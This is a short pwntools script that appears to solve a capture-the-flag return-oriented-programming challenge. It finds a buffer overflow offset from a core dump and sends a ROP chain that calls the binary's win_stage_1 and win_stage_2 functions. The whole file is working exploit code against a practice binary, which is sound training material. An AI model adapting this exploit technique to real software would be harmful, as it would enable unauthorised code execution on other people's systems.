#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level2.1')

io = elf.process(setuid=False) #disattivo il setuid per consentire al generazione del core dump
io.sendline(cyclic(512,n=8))
io.wait()
buffer_len = cyclic_find(io.corefile.fault_addr,n=8)
print(buffer_len)
io.close()

rop = ROP(elf)
#pop_rdi_ret = 0x00401833
#print(pop_rdi_ret)
print(rop.rdi.address)

rop.win_stage_1()
rop.win_stage_2()

PAYLOAD = b'A'*buffer_len + rop.chain()

io = elf.process()
io.sendline(PAYLOAD)
io.interactive()
